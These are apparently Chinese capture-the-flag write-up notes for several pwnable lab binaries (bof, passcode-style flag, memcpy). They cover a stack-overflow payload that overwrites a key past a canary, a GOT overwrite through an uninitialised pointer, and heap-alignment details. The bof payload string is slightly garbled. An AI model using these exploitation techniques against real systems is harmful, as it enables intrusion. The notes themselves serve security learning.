#### bof
**类型: 栈溢出, 覆盖关键值**

writeup: 虽然有栈保护(`canary`), 但并不影响, 因为 `canary` 的校验是在函数结束时进行校验. 所以溢出 `overflowme` 至 `key` 即可.

```
gdb-peda$ disassemble func
Dump of assembler code for function func:
   0x8000062c <+0>:     push   ebp
   0x8000062d <+1>:     mov    ebp,esp
   0x8000062f <+3>:     sub    esp,0x48
   0x80000632 <+6>:     mov    eax,gs:0x14
   0x80000638 <+12>:    mov    DWORD PTR [ebp-0xc],eax
   0x8000063b <+15>:    xor    eax,eax
   0x8000063d <+17>:    mov    DWORD PTR [esp],0x8000078c
   0x80000644 <+24>:    call   0xb7e897e0 <puts>
   0x80000649 <+29>:    lea    eax,[ebp-0x2c]
   0x8000064c <+32>:    mov    DWORD PTR [esp],eax
   0x8000064f <+35>:    call   0xb7e88e60 <gets>
   0x80000654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x8000065b <+47>:    jne    0x8000066b <func+63>
   0x8000065d <+49>:    mov    DWORD PTR [esp],0x8000079b
   0x80000664 <+56>:    call   0xb7e64310 <system>
   0x80000669 <+61>:    jmp    0x80000677 <func+75>
   0x8000066b <+63>:    mov    DWORD PTR [esp],0x800007a3
   0x80000672 <+70>:    call   0xb7e897e0 <puts>
   0x80000677 <+75>:    mov    eax,DWORD PTR [ebp-0xc]
   0x8000067a <+78>:    xor    eax,DWORD PTR gs:0x14
   0x80000681 <+85>:    je     0x80000688 <func+92>
   0x80000683 <+87>:    call   0xb7f1fb00 <__stack_chk_fail>
   0x80000688 <+92>:    leave
   0x80000689 <+93>:    ret
End of assembler dump.
```

分析下就知道了, 计算下两个位置的差即可, `'A' * (0x2c+0x8) + '\xbe\ba\fe\ca'`.

#### flag
**类型: 栈内容缓存和变量未初始化导致任意地址写内容.**

由于 `passcode1` 值未经过初始化, 因此使用之前栈内容, 并且之前栈内容可控, 导致 `passcode1` 的值可控.

并且由于 `scanf("%d", passcode1);`, 这句话并有写到 `& passcode1 `, 而写将值写到 `passcode1` 值的位置, 因为两点结合导致可写内容到任意位置.

直接修改 `fflush` 的 `.got.plt` 的地址为条件成立地址即可.

#### uaf

**类型: UAF 暂放**


#### memcpy
`movdqa` 和 `movntps` 指令执行, 地址必须 `16-bytes` 对齐.

因此要求 `malloc` 分配返回的地址必须是 `16-bytes` 对齐, 这需要了解 `glibc` 中 `ptmalloc` 的大致实现.

以下引用自 `<glibc内存管理ptmalloc源代码分析.pdf> P16`

> 为了使得 chunk 所占用的空间最小，ptmalloc 使用了空间复用，一个 chunk 或者正在 被使用，或者已经被 free 掉，所以 chunk 的中的一些域可以在使用状态和空闲状态表示不 同的意义，来达到空间复用的效果。以 32 位系统为例，空闲时，一个 chunk 中至少需要 4 个 size_t（4B）大小的空间，用来存储 prev_size，size，fd 和 bk （见上图），也就是 16B， chunk 的大小要对齐到 8B。当一个 chunk 处于使用状态时，它的下一个 chunk 的 prev_size 域肯定是无效的。所以实际上，这个空间也可以被当前 chunk 使用。这听起来有点不可思议， 但确实是合理空间复用的例子。故而实际上，一个使用中的 chunk 的大小的计算公式应该是： in_use_size = (用户请求大小+ 8 - 4 ) align to 8B，这里加 8 是因为需要存储 prev_size 和 size， 但又因为向下一个 chunk“借”了 4B，所以要减去 4。最后，因为空闲的 chunk 和使用中的 chunk 使用的是同一块空间。所以肯定要取其中最大者作为实际的分配空间。即最终的分配 空间 chunk_size = max(in_use_size, 16)。这就是当用户请求内存分配时，ptmalloc 实际需要 分配的内存大小，在后面的介绍中。如果不是特别指明的地方，指的都是这个经过转换的实 际需要分配的内存大小，而不是用户请求的内存分配大小。

[intel指令文档](http://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-instruction-set-reference-manual-325383.pdf)

[glibc内存管理ptmalloc源代码分析.pdf](https://github.com/121786404/C_Memory/blob/master/Doc/glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf)
